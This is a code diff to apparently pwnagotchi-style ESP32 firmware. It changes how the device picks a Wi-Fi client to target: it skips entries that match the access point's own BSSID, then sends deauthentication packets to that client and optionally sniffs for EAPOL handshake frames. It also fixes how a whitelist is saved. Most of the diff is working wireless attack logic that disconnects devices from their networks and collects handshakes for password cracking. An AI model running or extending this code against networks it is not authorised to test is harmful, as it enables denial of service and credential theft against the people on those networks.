@@ -110,6 +110,7 @@ void parseMacFromWhitelist() {
 }
 
 uint8_t wifiCheckInt = 0;
+int selectedClient;
 
 uint8_t getWiFiCheckInt(){
     return wifiCheckInt;
@@ -208,27 +209,38 @@ void pwnagothiLoop(){
             }
         
             if(clientLen > 0 && clients[0] != ""){
-                logMessage("Client count: " + String(clientLen));
-                setMood(1, "(d_b)", "I think that " + clients[0] + " doesn't need an internet..." );
-                logMessage("WiFi BSSID is: " + WiFi.BSSIDstr(wifiCheckInt));
-                logMessage("Client BSSID is: " + clients[clientLen - 1]);
-                updateUi(true, false);
-                delay(pwnagotchi.deauth_packet_delay);
-                esp_wifi_set_promiscuous(false);
-                break;
+                // Ensure client BSSID is different from AP BSSID
+                String apBssid = WiFi.BSSIDstr(wifiCheckInt);
+                selectedClient = 0;
+                logMessage("Comparing: AP BSSID " + apBssid + " with client BSSID " + clients[selectedClient]);
+                // Compare BSSIDs case-insensitively
+                while (selectedClient < clientLen && apBssid.equalsIgnoreCase(clients[selectedClient])) {
+                    selectedClient++;
+                }
+                if (selectedClient < clientLen && clients[selectedClient] != "") {
+                    logMessage("Client count: " + String(clientLen));
+                    setMood(1, "(d_b)", "I think that " + clients[selectedClient] + " doesn't need an internet..." );
+                    logMessage("WiFi BSSID is: " + apBssid);
+                    logMessage("Client BSSID is: " + clients[selectedClient]);
+                    updateUi(true, false);
+                    delay(pwnagotchi.deauth_packet_delay);
+                    esp_wifi_set_promiscuous(false);
+                    // For now, break out of the loop
+                    break;
+                }
             }
         
             updateUi(true, false);
         }
 
-        setMood(1, "(O_o)", "Well, well, well  " + clients[0] + " you're OUT!!!" );
-        logMessage("(O_o) Well, well, well  " + clients[0] + " you're OUT!!!");
+        setMood(1, "(O_o)", "Well, well, well  " + clients[selectedClient] + " you're OUT!!!" );
+        logMessage("(O_o) Well, well, well  " + clients[selectedClient] + " you're OUT!!!");
         updateUi(true, false);
 
         if(pwnagotchi.activate_sniffer_on_deauth){
             SnifferBegin(targetChanel);
             if(pwnagotchi.deauth_on){
-                if(send_deauth_packets(clients[0], pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay)){
+                if(send_deauth_packets(clients[selectedClient], pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay)){
                     logMessage("Deauth succesful");
                     SnifferLoop(); // let sniffer see some immediate frames if desired
                 }
@@ -240,7 +252,7 @@ void pwnagothiLoop(){
         }
         else{
             if(pwnagotchi.deauth_on){
-                if(send_deauth_packets(clients[0], pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay)){
+                if(send_deauth_packets(clients[selectedClient], pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay)){
                     logMessage("Deauth succesful");
                 }
                 else{
@@ -255,7 +267,7 @@ void pwnagothiLoop(){
 
         while(true){
             SnifferLoop();
-            if (SnifferGetClientCount() > currentCount) {
+            if (SnifferGetClientCount() > currentCount) { //Eapol count
                 while (SnifferPendingPackets() > 0) {
                     SnifferLoop();
                     updateUi(true, false);
@@ -319,7 +331,9 @@ void removeItemFromWhitelist(String valueToRemove) {
         }
     }
     
-    serializeJson(list, whitelist);
+    String newWhitelist;
+    serializeJson(list, newWhitelist);
+    whitelist = newWhitelist;
     saveSettings();
 }
 
